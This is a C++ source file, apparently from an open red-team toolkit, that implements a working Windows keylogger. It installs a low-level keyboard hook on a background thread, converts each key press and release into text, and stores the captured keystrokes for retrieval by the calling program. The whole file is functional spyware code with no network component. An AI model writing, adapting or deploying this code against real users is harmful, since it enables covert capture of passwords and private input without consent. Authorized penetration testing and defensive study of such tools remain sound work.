/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "keylogger.h"

HHOOK kbdhook = NULL;	/* Keyboard hook handle */
Keylogger* keylogger = NULL;
std::mutex keylogger_lock;
bool thread_active = false;

Keylogger::Keylogger()
{
    this->logged_keys = "";
}

Keylogger::~Keylogger()
{
}

bool Keylogger::start_keylogger()
{
	keylogger_lock.lock();

	if (keylogger != NULL)
	{
		keylogger_lock.unlock();
		return false;
	}

	keylogger = this;

	HANDLE keylogger_thread = CreateThread(0, 0, logger_thread, NULL, 0, NULL);

	keylogger_lock.unlock();

	return true;
}

DWORD WINAPI logger_thread(LPVOID lpParameter)
{
    /*
    * source: https://cplusplus.com/forum/lounge/27569/
    */

	thread_active = true;

    HINSTANCE modulehandle = GetModuleHandle(NULL);
    kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	if (kbdhook == NULL)
	{
		return 1;
	}

	MSG m;
	while (true) {
		UINT_PTR timer = SetTimer(NULL, NULL, 1000, NULL);
		BOOL res = GetMessageA(&m, NULL, 0, 0);
		KillTimer(NULL, timer);

		if (res == FALSE)
			break;

		keylogger_lock.lock();
		if (keylogger == NULL)
		{
			keylogger_lock.unlock();
			break;
		}
		keylogger_lock.unlock();

		TranslateMessage(&m);
		DispatchMessage(&m);
	}

	UnhookWindowsHookEx(kbdhook);

	thread_active = false;

	return 0;
}

bool Keylogger::stop_keylogger()
{
	keylogger_lock.lock();

	if (keylogger == NULL)
	{
		keylogger_lock.unlock();
		return false;
	}

	keylogger = NULL;
	keylogger_lock.unlock();

	// Wait for thread to end
	while (thread_active == true)
		Sleep(100);

	return true;
}

std::string Keylogger::get_logged_keys()
{
	keylogger_lock.lock();

	if (keylogger == NULL)
	{
		keylogger_lock.unlock();
		return "";
	}

	std::string output = this->logged_keys;
	this->logged_keys = "";

	keylogger_lock.unlock();

	return output;
}

__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	/*
	* source: https://cplusplus.com/forum/lounge/27569/
	*/

	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		 * Get key name as string
		 */
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		 * Non-printable characters only:
		 * Some of these (namely; newline, space and tab) will be
		 * made into printable characters.
		 * Others are encapsulated in brackets ('[' and ']').
		 */
		if (!printable) {
			/*
			 * Keynames that may become printable characters are
			 * handled here.
			 */
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			}
			else if (str == "SPACE") {
				str = " ";
				printable = true;
			}
			else if (str == "TAB") {
				str = "\t";
				printable = true;
			}
			else {
				str = ("@[" + str + "]");
			}
		}

		if (printable) {
			for (size_t i = 0; i < str.length(); ++i)
				str[i] = tolower(str[i]);
		}

		keylogger_lock.lock();

		if (keylogger != NULL)
			keylogger->logged_keys += str;

		keylogger_lock.unlock();
	}
	else if (code == HC_ACTION && (wp == WM_SYSKEYUP || wp == WM_KEYUP))
	{
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		 * Get key name as string
		 */
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		 * Non-printable characters only:
		 * Some of these (namely; newline, space and tab) will be
		 * made into printable characters.
		 * Others are encapsulated in brackets ('[' and ']').
		 */
		if (!printable) {
			/*
			 * Keynames that may become printable characters are
			 * handled here.
			 */
			if (str == "ENTER") {
			}
			else if (str == "SPACE") {
			}
			else if (str == "TAB") {
			}
			else {
				str = ("@release[" + str + "]");

				if (keylogger != NULL)
					keylogger->logged_keys += str;
			}
		}
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}
